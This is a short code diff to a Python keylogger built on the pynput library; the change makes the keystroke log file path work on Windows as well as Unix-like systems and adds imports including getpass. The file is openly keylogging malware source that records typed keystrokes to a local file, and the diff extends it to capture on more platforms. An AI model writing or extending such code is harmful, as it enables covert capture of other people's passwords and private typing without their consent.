@@ -6,9 +6,17 @@ from pynput import keyboard
 
 special_keys = {'Key.enter': '\n', 'Key.space': ' '}
 
+import getpass
+import platform
+from pathlib import Path
+
 class Keylogger:
     def __init__(self):
-        self.keylogs = '/tmp/keystrokes'
+        # Use a cross-platform path for the keystroke log file
+        if platform.system() == 'Windows':
+            self.keylogs = str(Path.home() / 'keystrokes.txt')
+        else:
+            self.keylogs = '/tmp/keystrokes'
         self.keylogsfile = open(self.keylogs, 'a+')
 
     def __write_character(self, character):
